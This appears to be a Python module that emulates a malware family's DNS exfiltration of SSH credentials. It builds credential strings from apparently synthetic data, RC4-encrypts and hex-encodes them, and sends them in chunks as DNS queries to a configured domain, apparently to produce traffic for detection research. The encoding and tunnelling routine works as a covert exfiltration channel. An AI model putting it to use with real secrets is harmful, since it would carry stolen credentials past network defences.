import asyncio
from binascii import crc32
from os import urandom
import random

from tdns.exfil import exfil, SEND_GETHOST, MAX_LBL_SIZE


class kessel(exfil):

    idchar = 'k'

    def __init__(self, mini_delay=0, amount=30, time=60, method=SEND_GETHOST, resolver_addr=None, random_delay=False, prepend=True):
        '''
        args:
            mini_delay: The delay between the split messages that are exfiltrating the same data.
            amount: The number of eventual DNS messages can be greater due to the splitting.
        '''
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend)
        self.mini_delay = mini_delay

    '''
    https://en.wikipedia.org/wiki/RC4
    '''

    def encrypt(self, text: str):
        key = urandom(4)

        def KSA(key):
            S = list(range(256))
            j = 0
            for i in range(256):
                j = (j + S[i] + key[i % 4]) % 256
                S[i], S[j] = S[j], S[i]
            return S

        def PRGA(S):
            i = 0
            j = 0
            while True:
                i = (i + j) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                yield S[(S[i] + S[j]) % 256]

        ciphertext = b''.join([(ord(c) ^ k).to_bytes(1, 'little')
                              for c, k in zip(text, PRGA(KSA(key)))])
        crc = crc32(ciphertext)
        return ciphertext + crc.to_bytes(4, 'little') + key + b';'

    def encode(self, ciphertext: bytes):
        return ciphertext.hex()

    def password(self):
        return f'ssh:{self.data.hostname(0)}:{self.data.user_name()}:{self.data.password()}:{self.data.user_name()}'

    def key(self):
        return f'sshkey:{self.data.hostname(0)}:{self.data.user_name()}:{self.data.file_name(extension="")}:{self.data.password()}:{self.data.user_name()}'

    def split_names(self, text: str):
        split_sub = [text[i:i+MAX_LBL_SIZE]
                     for i in range(0, len(text), MAX_LBL_SIZE)]
        split_queries = ['.'.join(split_sub[i:i+3])
                         for i in range(0, len(split_sub), 3)]
        return split_queries

    async def call__aux(self):
        data_choice = [self.password, self.key]
        while self.amount > 0:
            text = random.choice(data_choice)()
            encrypted = self.encrypt(text)
            encoded = self.encode(encrypted)
            for qnames in self.split_names(encoded):
                self.amount -= 1
                await self.method(f'{qnames}.{self.domain}')
                await asyncio.sleep(self.mini_delay) 
            await asyncio.sleep(self.delay())
